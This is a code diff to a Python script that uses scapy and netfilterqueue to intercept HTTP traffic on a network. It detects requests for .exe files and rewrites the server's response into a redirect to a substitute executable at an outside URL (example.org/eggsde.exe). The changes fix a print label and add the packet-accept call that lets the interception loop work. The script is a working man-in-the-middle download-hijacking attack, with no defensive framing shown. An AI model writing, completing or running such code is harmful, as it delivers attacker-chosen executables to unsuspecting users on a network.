@@ -21,7 +21,7 @@ def process_packet(packet):
     scapy_packet = IP(packet.get_payload())  # Transform raw packet to scapy.
     if scapy_packet.haslayer(Raw):  # Checking if a packet has a Raw response on the TCP layer.
         if scapy_packet[TCP].dport == 80:  # dport is incoming
-            print("HTTP Response")
+            print("HTTP Request")
             if b".exe" in scapy_packet[Raw].load:  # Is there an exe is the http data?
                 print("[+] exe Request")
                 ack_list.append(scapy_packet[TCP].ack)
@@ -36,6 +36,8 @@ def process_packet(packet):
                                             "Location: http://www.example.org/eggsde.exe\n\n")
                                            )
                 packet.set_payload(bytes(modified_packet))  # Put packet back into regular form.
+
+    packet.accept()
 
 
 queue = netfilterqueue.NetfilterQueue()
